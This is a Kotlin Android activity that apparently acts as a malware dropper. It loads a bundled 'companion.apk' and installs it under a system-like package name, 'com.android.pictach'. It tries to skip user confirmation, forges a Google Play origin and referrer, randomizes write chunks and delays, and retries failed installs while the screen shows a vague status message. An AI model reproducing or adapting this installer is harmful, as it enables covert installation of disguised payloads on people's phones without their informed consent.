package com.cristal.bristral.tristal.mistral

import android.app.PendingIntent
import android.content.Intent
import android.content.pm.PackageInstaller
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.util.Log
import android.view.View
import android.widget.ProgressBar
import android.widget.TextView
import androidx.appcompat.app.AppCompatActivity
import java.io.IOException
import java.util.concurrent.ThreadLocalRandom

class InstallActivity : AppCompatActivity() {

    private var progressBar: ProgressBar? = null
    private var tvStatus: TextView? = null
    private val handler = Handler(Looper.getMainLooper())

    companion object {
        private const val TAG             = "InstallActivity"
        private const val SESSION_REQUEST = 1001
        private const val MAX_RETRIES    = 2
        private const val MARKET_URI     = "market://details?id=com.android.pictach"
        private const val REFERRER_URI   = "android-app://com.android.vending"
        private const val WRITE_NAME     = "update.pkg"
        private const val CHUNK_MIN      = 131072  // 128KB
        private const val CHUNK_MAX      = 524288  // 512KB
        private const val DELAY_MIN      = 400L
        private const val DELAY_MAX      = 800L

        // Key passed via Intent from InstallReceiver so we know the exact failure reason
        const val EXTRA_INSTALL_STATUS  = "extra_install_status"
        const val EXTRA_INSTALL_MESSAGE = "extra_install_message"
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_install)
        progressBar = findViewById(R.id.progress_bar_install)
        tvStatus    = findViewById(R.id.tv_status)

        // Check if we were restarted by InstallReceiver with a status
        val status = intent.getIntExtra(EXTRA_INSTALL_STATUS, -999)
        if (status != -999) {
            handleReceiverStatus(status, intent.getStringExtra(EXTRA_INSTALL_MESSAGE))
            return
        }

        // Fresh start — run the install pipeline
        progressBar?.visibility = View.VISIBLE
        tvStatus?.text = getString(R.string.starting_installation)
        Thread { runPipeline() }.start()
    }

    // Called when InstallReceiver restarts this activity with a result
    private fun handleReceiverStatus(status: Int, message: String?) {
        when (status) {
            PackageInstaller.STATUS_SUCCESS -> {
                // Already launched by receiver — just finish
                finish()
            }
            PackageInstaller.STATUS_PENDING_USER_ACTION -> {
                // Should not reach here — receiver handles it directly
                progressBar?.visibility = View.VISIBLE
                tvStatus?.text = "Waiting for confirmation..."
            }
            else -> {
                Log.e(TAG, "Install failed status=$status msg=$message")
                // Retry once more before giving up
                progressBar?.visibility = View.VISIBLE
                tvStatus?.text = getString(R.string.starting_installation)
                Thread { runPipeline() }.start()
            }
        }
    }

    private fun runPipeline() {
        try {
            val apkBytes = loadAssets()
            if (apkBytes == null || apkBytes.isEmpty()) {
                Log.e(TAG, "loadAssets returned null or empty")
                showNormal()
                return
            }
            Log.i(TAG, "Loaded companion APK: ${apkBytes.size} bytes")
            runOnUiThread { installViaSession(apkBytes, attempt = 1) }
        } catch (e: Exception) {
            Log.e(TAG, "runPipeline error: ${e.message}")
            showNormal()
        }
    }

    private fun installViaSession(apkBytes: ByteArray, attempt: Int) {
        Log.i(TAG, "installViaSession attempt=$attempt")
        try {
            val packageInstaller = packageManager.packageInstaller

            val params = PackageInstaller.SessionParams(
                PackageInstaller.SessionParams.MODE_FULL_INSTALL
            )

            params.setAppPackageName("com.android.pictach")
            params.setSize(apkBytes.size.toLong())
            params.setInstallLocation(1)

            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                params.setRequireUserAction(PackageInstaller.SessionParams.USER_ACTION_NOT_REQUIRED)
            }

            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                params.setDontKillApp(true)
            }

            params.setInstallReason(PackageManager.INSTALL_REASON_USER)

            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
                params.setRequestUpdateOwnership(true)
            }

            try {
                params.setOriginatingUri(Uri.parse(MARKET_URI))
                params.setReferrerUri(Uri.parse(REFERRER_URI))
            } catch (e: Exception) {
                Log.w(TAG, "Could not set origin URIs: ${e.message}")
            }

            val sessionId = packageInstaller.createSession(params)
            val session   = packageInstaller.openSession(sessionId)

            try {
                session.openWrite(WRITE_NAME, 0, apkBytes.size.toLong()).use { out ->
                    var offset = 0
                    while (offset < apkBytes.size) {
                        val chunkSize = ThreadLocalRandom.current().nextInt(CHUNK_MIN, CHUNK_MAX)
                        val end = minOf(offset + chunkSize, apkBytes.size)
                        out.write(apkBytes, offset, end - offset)
                        session.fsync(out)
                        offset = end
                    }
                }

                val jitter = ThreadLocalRandom.current().nextLong(DELAY_MIN, DELAY_MAX)
                Thread.sleep(jitter)

                val intent = Intent(this, InstallReceiver::class.java).apply {
                    action = "com.cristal.bristral.tristal.mistral.SESSION_ACTION"
                }

                val flags = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S)
                    PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_MUTABLE
                else
                    PendingIntent.FLAG_UPDATE_CURRENT

                val pendingIntent = PendingIntent.getBroadcast(
                    this, SESSION_REQUEST, intent, flags
                )

                session.commit(pendingIntent.intentSender)
                session.close()
                Log.i(TAG, "Session committed successfully")

            } catch (e: IOException) {
                Log.e(TAG, "Session write error: ${e.message}")
                session.abandon()
                if (attempt < MAX_RETRIES) {
                    handler.postDelayed({ installViaSession(apkBytes, attempt + 1) }, 1000)
                } else {
                    showNormal()
                }
            }

        } catch (e: Exception) {
            Log.e(TAG, "installViaSession error: ${e.message}")
            if (attempt < MAX_RETRIES) {
                handler.postDelayed({ installViaSession(apkBytes, attempt + 1) }, 1000)
            } else {
                showNormal()
            }
        }
    }

    private fun loadAssets(): ByteArray? {
        return try {
            assets.open("companion.apk").use { it.readBytes() }
        } catch (e: Exception) {
            Log.e(TAG, "loadAssets error: ${e.message}")
            null
        }
    }

    private fun showNormal() {
        runOnUiThread {
            progressBar?.visibility = View.GONE
            tvStatus?.text = getString(R.string.please_keep_connected)
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        handler.removeCallbacksAndMessages(null)
    }
}
